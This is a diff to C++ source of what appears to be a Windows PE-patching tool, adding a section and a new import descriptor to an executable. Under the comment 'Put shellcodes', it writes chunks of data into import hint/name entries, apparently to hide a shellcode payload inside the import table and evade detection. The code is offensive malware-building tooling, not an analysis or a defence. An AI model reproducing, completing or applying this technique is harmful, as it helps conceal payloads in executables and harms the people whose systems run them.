@@ -6,6 +6,8 @@
 #include "Utils.h"
 #define P2ALIGNUP(size, align) ((((size) / (align)) + 1) * (align))
 
+LPCSTR* nameArray = NULL;
+
 DWORD Rva2Offset(DWORD dwRva, PBYTE uiBaseAddress) {
 	WORD wIndex = 0;
 	PIMAGE_SECTION_HEADER pSectionHeader = NULL;
@@ -114,7 +116,7 @@ PBYTE AddNewSection(PBYTE oldFileBuffer, uint64_t oldFileSize, uint64_t numberOf
 		// add one extra dll entry
 		dwNewImportDescriptorEntryCount = dwExistingImportDescriptorEntryCount + 1;
 	}
-	LPCSTR* nameArray = SelectDLLEntries(dllNames[0], numberOfChunks);
+	nameArray = SelectDLLEntries(dllNames[0], numberOfChunks);
 	if (nameArray == NULL) {
 		std::cout << "[!] Error on reading DLL imports !" << std::endl;
 		return NULL;
@@ -169,20 +171,19 @@ PBYTE AddNewSection(PBYTE oldFileBuffer, uint64_t oldFileSize, uint64_t numberOf
 }
 
 
-void AddNewImportEntry(PBYTE fileBuffer) {
-	/*
+void AddNewImportEntry(PBYTE fileBuffer,PWORD hintArray,uint64_t numberOfChunks) {
 	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)fileBuffer;
 	PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(fileBuffer + dosHeader->e_lfanew);
 	PIMAGE_SECTION_HEADER sectionHeaderArray = (PIMAGE_SECTION_HEADER)(((PBYTE)ntHeaders) + sizeof(IMAGE_NT_HEADERS));
 	PBYTE sectionStart = fileBuffer + sectionHeaderArray[ntHeaders->FileHeader.NumberOfSections - 1].PointerToRawData;
-	PIMAGE_THUNK_DATA ImportLookupTable = (PIMAGE_THUNK_DATA)HeapAlloc(GetProcessHeap(), 0, sizeof(IMAGE_THUNK_DATA) * (flagValuesCount + 1));
+	PIMAGE_THUNK_DATA ImportLookupTable = (PIMAGE_THUNK_DATA)HeapAlloc(GetProcessHeap(), 0, sizeof(IMAGE_THUNK_DATA) * (numberOfChunks + 1));
 	IMAGE_IMPORT_DESCRIPTOR newDllImportDescriptors[2];
 	PIMAGE_IMPORT_DESCRIPTOR oldDirectory = (PIMAGE_IMPORT_DESCRIPTOR)(fileBuffer + Rva2Offset(ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress, fileBuffer));
 	DWORD dwExistingImportDescriptorEntryCount = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size / sizeof(IMAGE_IMPORT_DESCRIPTOR);
 	DWORD dwNewImportDescriptorEntryCount = 0;
 	uint64_t functionStringLengths = 0;
-	for (int i = 0; i < flagValuesCount; i++) {
-		functionStringLengths += strlen(flagValues[i]);
+	for (int i = 0; i < numberOfChunks; i++) {
+		functionStringLengths += strlen(nameArray[i]);
 		functionStringLengths++;
 	}
 	if (dwExistingImportDescriptorEntryCount == 0)
@@ -197,30 +198,33 @@ void AddNewImportEntry(PBYTE fileBuffer) {
 	}
 	DWORD dwNewImportDescriptorListDataLength = dwNewImportDescriptorEntryCount * sizeof(IMAGE_IMPORT_DESCRIPTOR);
 	PBYTE freeMemoryStartAfterDir = sectionStart + dwNewImportDescriptorListDataLength;
-	PBYTE freeMemoryStartAfterString = freeMemoryStartAfterDir + strlen(newDllName) + functionStringLengths + 1 + sizeof(WORD) * flagValuesCount;
-	memset(freeMemoryStartAfterDir, 0x00, strlen(newDllName) + functionStringLengths + 1 + sizeof(WORD) * flagValuesCount);
-	memcpy(freeMemoryStartAfterDir, newDllName, strlen(newDllName));
-	for (int i = 0, offset = 2; i < flagValuesCount; i++) {
-		memset(freeMemoryStartAfterDir + strlen(newDllName) + 1, 0xFFFF, 2);
-		memcpy(freeMemoryStartAfterDir + strlen(newDllName) + 1 + offset, flagValues[i], strlen(flagValues[i]));
-		offset = offset + strlen(flagValues[i]) + 1 + sizeof(WORD);
+	PBYTE freeMemoryStartAfterString = freeMemoryStartAfterDir + strlen(dllNames[0]) + functionStringLengths + 1 + sizeof(WORD) * numberOfChunks;
+	memset(freeMemoryStartAfterDir, 0x00, strlen(dllNames[0]) + functionStringLengths + 1 + sizeof(WORD) * numberOfChunks);
+	memcpy(freeMemoryStartAfterDir, dllNames[0], strlen(dllNames[0]));
+	// Put shellcodes
+	PIMAGE_IMPORT_BY_NAME hintNameEntries = (PIMAGE_IMPORT_BY_NAME)(freeMemoryStartAfterDir + strlen(dllNames[0])+1);
+	for (int i = 0, offset = 2; i < numberOfChunks; i++) {
+		memcpy(&hintNameEntries->Hint, &hintArray[i], sizeof(WORD));
+		memcpy(&hintNameEntries->Name , nameArray[i], strlen(nameArray[i]));
+		//offset = offset + strlen(flagValues[i]) + 1 + sizeof(WORD);
+		hintNameEntries = (PIMAGE_IMPORT_BY_NAME)(((PBYTE)hintNameEntries) + sizeof(WORD) + strlen(nameArray[i])+1);
 	}
 
-	PBYTE thunkAddress = freeMemoryStartAfterDir + strlen(newDllName) + 1;
+	PBYTE thunkAddress = freeMemoryStartAfterDir + strlen(dllNames[0]) + 1;
 	DWORD sectionStartOffset = sectionHeaderArray[ntHeaders->FileHeader.NumberOfSections - 1].PointerToRawData;
 	DWORD sectionRVA = sectionHeaderArray[ntHeaders->FileHeader.NumberOfSections - 1].VirtualAddress;
 
 	// set import lookup table values (import ordinal #1)
-
-	ImportLookupTable[flagValuesCount].u1.AddressOfData = 0;
+	// last one
+	ImportLookupTable[numberOfChunks].u1.AddressOfData = 0;
 	ImportLookupTable[0].u1.AddressOfData = (sectionRVA - sectionStartOffset + (thunkAddress - fileBuffer));
 	uint64_t cursorOffset = 0;
-	for (int i = 1; i < flagValuesCount; i++) {
-		cursorOffset = cursorOffset + sizeof(WORD) + strlen(flagValues[i - 1]) + 1;
+	for (int i = 1; i < numberOfChunks; i++) {
+		cursorOffset = cursorOffset + sizeof(WORD) + strlen(nameArray[i - 1]) + 1;
 		ImportLookupTable[i].u1.AddressOfData = (DWORD)(sectionRVA - sectionStartOffset + (thunkAddress + cursorOffset - fileBuffer));
 	}
-	memcpy(freeMemoryStartAfterString, ImportLookupTable, sizeof(IMAGE_THUNK_DATA) * (flagValuesCount + 1));
-	memcpy(freeMemoryStartAfterString + sizeof(IMAGE_THUNK_DATA) * (flagValuesCount + 1), ImportLookupTable, sizeof(IMAGE_THUNK_DATA) * (flagValuesCount + 1));
+	memcpy(freeMemoryStartAfterString, ImportLookupTable, sizeof(IMAGE_THUNK_DATA) * (numberOfChunks + 1));
+	memcpy(freeMemoryStartAfterString + sizeof(IMAGE_THUNK_DATA) * (numberOfChunks + 1), ImportLookupTable, sizeof(IMAGE_THUNK_DATA) * (numberOfChunks + 1));
 	memcpy(sectionStart, oldDirectory, ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size);
 	// We need one for Import Lookup Table, one for Import Address Table - OriginalFirstThunk and FirstThunk
 	// set import descriptor values for injected dll
@@ -228,7 +232,7 @@ void AddNewImportEntry(PBYTE fileBuffer) {
 	newDllImportDescriptors[0].TimeDateStamp = 0;
 	newDllImportDescriptors[0].ForwarderChain = 0;
 	newDllImportDescriptors[0].Name = (DWORD)(freeMemoryStartAfterDir - fileBuffer - sectionStartOffset + sectionRVA);
-	newDllImportDescriptors[0].FirstThunk = (DWORD)(freeMemoryStartAfterString - fileBuffer - sectionStartOffset + sectionRVA + sizeof(IMAGE_THUNK_DATA) * (flagValuesCount + 1));
+	newDllImportDescriptors[0].FirstThunk = (DWORD)(freeMemoryStartAfterString - fileBuffer - sectionStartOffset + sectionRVA + sizeof(IMAGE_THUNK_DATA) * (numberOfChunks + 1));
 
 	// end of import descriptor chain
 	newDllImportDescriptors[1].OriginalFirstThunk = 0;
@@ -239,5 +243,5 @@ void AddNewImportEntry(PBYTE fileBuffer) {
 	memcpy(sectionStart + dwNewImportDescriptorListDataLength - sizeof(newDllImportDescriptors), newDllImportDescriptors, sizeof(newDllImportDescriptors));
 	ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress = sectionHeaderArray[ntHeaders->FileHeader.NumberOfSections - 1].VirtualAddress;
 	ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size = dwNewImportDescriptorListDataLength;
-	*/
+	
 }
